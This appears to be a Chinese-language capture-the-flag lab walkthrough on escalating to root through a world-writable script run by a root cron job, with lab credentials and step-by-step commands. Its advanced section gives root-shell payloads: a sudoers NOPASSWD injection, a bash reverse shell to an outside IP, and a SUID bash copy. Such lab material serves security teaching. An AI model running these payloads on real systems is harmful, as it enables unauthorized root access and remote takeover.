# 电脑D 提权完整教程（Cron 提权）

> **目标**：D 禁止 root 直登，需要从普通用户 `userd` 登录，利用 **Cron 提权** 拿到 root，读取 Flag。
> **Flag**：`FLAG{D_CRON_PRIVESC_OK}`（校验页面 `http://172.32.0.30/flag.php`）

---

## 一、为什么需要提权？

D 的 SSH 配置**禁止 root 直接登录**（`PermitRootLogin no`），只能用普通用户：
- 用户名：`userd`
- 密码：`passd123`

普通用户 `userd` **读不了** `/root/flag.txt`（权限 `-rw-------`），必须提权到 root 才能读。

---

## 二、提权原理（30秒理解）

D 上有一个**脆弱的 cron 任务**：
```
* * * * * root /usr/local/bin/backup.sh
```
- **以 root 身份**每分钟执行一次 `backup.sh`
- 但 `backup.sh` 的权限是 **`-rwxrwxrwx`**（普通用户可写）

**提权核心**：普通用户 `userd` 改写 `backup.sh`，注入恶意命令 → cron 以 root 执行它 → 注入的命令就以 root 身份运行 → 提权成功。

---

## 三、提权完整流程

### 第1步：登录 D 的普通用户

```bash
# 从 B 上 SSH 进 D（D 的内网IP 172.32.0.30）
ssh userd@172.32.0.30    # 密码 passd123
```

验证当前身份（无 root 权限）：
```bash
whoami    # userd
id        # uid=1000(userd) ...

# 尝试读 root 的 flag（会被拒绝）
cat /root/flag.txt
# Permission denied   ← 需要提权
```

### 第2步：确认 Cron 提权点

```bash
# 查看 cron 任务（root 每分钟执行 backup.sh）
cat /etc/cron.d/backup
# * * * * * root /usr/local/bin/backup.sh

# 确认 backup.sh 普通用户可写（关键！）
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root ... backup.sh
#    ^^^^^ 普通用户可写 + root执行 = 提权点
```

### 第3步：改写 backup.sh，注入提权 Payload

让 backup.sh 以 root 身份把 flag 复制到 /tmp（userd 可读）：

```bash
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'cp /root/flag.txt /tmp/flag_out.txt' >> /usr/local/bin/backup.sh
echo 'chmod 777 /tmp/flag_out.txt' >> /usr/local/bin/backup.sh

# 确认注入成功
cat /usr/local/bin/backup.sh
```

### 第4步：等待 cron 执行（最多1分钟），读取提权后的 flag

```bash
sleep 65          # 等 cron 以 root 执行 backup.sh
cat /tmp/flag_out.txt
# FLAG{D_CRON_PRIVESC_OK}p
```

### 第5步：校验 Flag

浏览器访问 `http://172.32.0.30/flag.php`，填入 `FLAG{D_CRON_PRIVESC_OK}`，看到 **"✓ 正确! 电脑D 提权成功!"**。

---

## 四、提权拿 root shell（进阶）

如果不止想读 flag，还想拿 root shell，改注入 payload 即可。

**方式A：写 sudoers（推荐，最实用）**
```bash
echo 'userd ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
# 等 cron 执行后, userd 就能直接 sudo 提权:
sudo cat /root/flag.txt
```

**方式B：反向 shell（注意本靶场 Docker 网络不通反弹）**
```bash
echo 'bash -i >& /dev/tcp/192.168.1.110/8888 0>&1' >> /usr/local/bin/backup.sh
```
> ⚠️ 本靶场是 Docker bridge 网络，容器无法连回宿主机 IP，反弹 shell 会失败。**不推荐用反弹**。

**方式C：复制 root shell 到可读位置**
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /usr/local/bin/backup.sh
# 等 cron 执行后:
/tmp/rootbash -p    # SUID root shell
```

---

## 五、全部命令一句话版

```bash
# 1. 登录 userd
ssh userd@172.32.0.30                # passd123

# 2. 注入提权 payload
echo -e '#!/bin/bash\ncp /root/flag.txt /tmp/flag_out.txt\nchmod 777 /tmp/flag_out.txt' > /usr/local/bin/backup.sh

# 3. 等 cron 执行并读 flag
sleep 65
cat /tmp/flag_out.txt                # FLAG{D_CRON_PRIVESC_OK}
```

---

## 六、常见问题

**Q: 等了65秒还没 flag？**
A: 确认 cron 在运行：`pgrep cron`。没运行则 `service cron start`。确认 backup.sh 确实是 `rwxrwxrwx`。

**Q: 读不到 /root/flag.txt？**
A: 说明提权 payload 没被执行。检查 backup.sh 内容正确、cron 在跑、等待时间够。

**Q: 想拿 root 但不想等 cron？**
A: 等 cron 执行一次写 sudoers 后，`sudo cat /root/flag.txt` 随时可提权。

**Q: D 和 C 能互通吗？**
A: **不能**。D 仅与 B 互通（b-d 网段），与 C 隔离（不同 bridge 网络）。提权 D 只能从 B 走。

---

## 七、速查表

| 项 | 值 |
|----|-----|
| D 内网IP | 172.32.0.30 |
| 登录用户 | userd / passd123 |
| root 直登 | 禁止（需提权） |
| 提权点 | /usr/local/bin/backup.sh（777权限, root每分钟执行） |
| cron 任务 | /etc/cron.d/backup |
| 提权后读 | /root/flag.txt |
| Flag | FLAG{D_CRON_PRIVESC_OK} |
| 校验页面 | http://172.32.0.30/flag.php |